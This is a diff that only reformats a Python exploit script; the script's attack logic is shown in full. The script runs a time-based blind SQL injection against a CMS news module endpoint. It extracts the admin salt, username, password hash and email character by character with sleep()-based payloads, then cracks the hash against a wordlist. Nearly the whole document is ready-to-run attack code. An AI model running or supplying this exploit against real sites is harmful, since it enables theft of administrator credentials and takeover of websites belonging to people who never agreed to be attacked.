@@ -18,21 +18,44 @@ import optparse
 import hashlib
 
 parser = optparse.OptionParser()
-parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
-parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
-parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)
+parser.add_option(
+    "-u",
+    "--url",
+    action="store",
+    dest="url",
+    help="Base target uri (ex. http://10.10.10.100/cms)",
+)
+parser.add_option(
+    "-w",
+    "--wordlist",
+    action="store",
+    dest="wordlist",
+    help="Wordlist for crack admin password",
+)
+parser.add_option(
+    "-c",
+    "--crack",
+    action="store_true",
+    dest="cracking",
+    help="Crack password with wordlist",
+    default=False,
+)
 
 options, args = parser.parse_args()
 if not options.url:
     print("[+] Specify an url target")
     print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
-    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
-    print("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
+    print(
+        "[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist"
+    )
+    print(
+        "[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based."
+    )
     exit()
 
-url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
+url_vuln = options.url + "/moduleinterface.php?mact=News,m1_,default,0"
 session = requests.Session()
-dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
+dictionary = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$"
 flag = True
 password = ""
 temp_password = ""
@@ -41,16 +64,17 @@ db_name = ""
 output = ""
 email = ""
 
-salt = ''
+salt = ""
 wordlist = ""
 if options.wordlist:
     wordlist += options.wordlist
+
 
 def crack_password():
     global password
     global output
     global wordlist
-    global salt  
+    global salt
     dict = open(wordlist)
     for line in dict.readlines():
         line = line.replace("\n", "")
@@ -60,16 +84,19 @@ def crack_password():
             break
     dict.close()
 
+
 def beautify_print_try(value):
     global output
     print("\033c")
-    cprint(output,'green', attrs=['bold'])
-    cprint('[*] Try: ' + value, 'red', attrs=['bold'])
+    cprint(output, "green", attrs=["bold"])
+    cprint("[*] Try: " + value, "red", attrs=["bold"])
+
 
 def beautify_print():
     global output
     print("\033c")
-    cprint(output,'green', attrs=['bold'])
+    cprint(output, "green", attrs=["bold"])
+
 
 def dump_salt():
     global flag
@@ -83,7 +110,13 @@ def dump_salt():
             temp_salt = salt + dictionary[i]
             ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
             beautify_print_try(temp_salt)
-            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
+            payload = (
+                "a,b,1,5))+and+(select+sleep("
+                + str(TIME)
+                + ")+from+cms_siteprefs+where+sitepref_value+like+0x"
+                + ord_salt_temp
+                + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
+            )
             url = url_vuln + "&m1_idlist=" + payload
             start_time = time.time()
             r = session.get(url)
@@ -95,7 +128,8 @@ def dump_salt():
             salt = temp_salt
             ord_salt = ord_salt_temp
     flag = True
-    output += '\n[+] Salt for password found: ' + salt
+    output += "\n[+] Salt for password found: " + salt
+
 
 def dump_password():
     global flag
@@ -110,7 +144,11 @@ def dump_password():
             ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
             beautify_print_try(temp_password)
             payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
-            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
+            payload += (
+                "+where+password+like+0x"
+                + ord_password_temp
+                + "25+and+user_id+like+0x31)+--+"
+            )
             url = url_vuln + "&m1_idlist=" + payload
             start_time = time.time()
             r = session.get(url)
@@ -122,7 +160,8 @@ def dump_password():
             password = temp_password
             ord_password = ord_password_temp
     flag = True
-    output += '\n[+] Password found: ' + password
+    output += "\n[+] Password found: " + password
+
 
 def dump_username():
     global flag
@@ -136,7 +175,13 @@ def dump_username():
             temp_db_name = db_name + dictionary[i]
             ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
             beautify_print_try(temp_db_name)
-            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
+            payload = (
+                "a,b,1,5))+and+(select+sleep("
+                + str(TIME)
+                + ")+from+cms_users+where+username+like+0x"
+                + ord_db_name_temp
+                + "25+and+user_id+like+0x31)+--+"
+            )
             url = url_vuln + "&m1_idlist=" + payload
             start_time = time.time()
             r = session.get(url)
@@ -147,8 +192,9 @@ def dump_username():
         if flag:
             db_name = temp_db_name
             ord_db_name = ord_db_name_temp
-    output += '\n[+] Username found: ' + db_name
+    output += "\n[+] Username found: " + db_name
     flag = True
+
 
 def dump_email():
     global flag
@@ -162,7 +208,13 @@ def dump_email():
             temp_email = email + dictionary[i]
             ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
             beautify_print_try(temp_email)
-            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
+            payload = (
+                "a,b,1,5))+and+(select+sleep("
+                + str(TIME)
+                + ")+from+cms_users+where+email+like+0x"
+                + ord_email_temp
+                + "25+and+user_id+like+0x31)+--+"
+            )
             url = url_vuln + "&m1_idlist=" + payload
             start_time = time.time()
             r = session.get(url)
@@ -173,8 +225,9 @@ def dump_email():
         if flag:
             email = temp_email
             ord_email = ord_email_temp
-    output += '\n[+] Email found: ' + email
+    output += "\n[+] Email found: " + email
     flag = True
+
 
 dump_salt()
 dump_username()
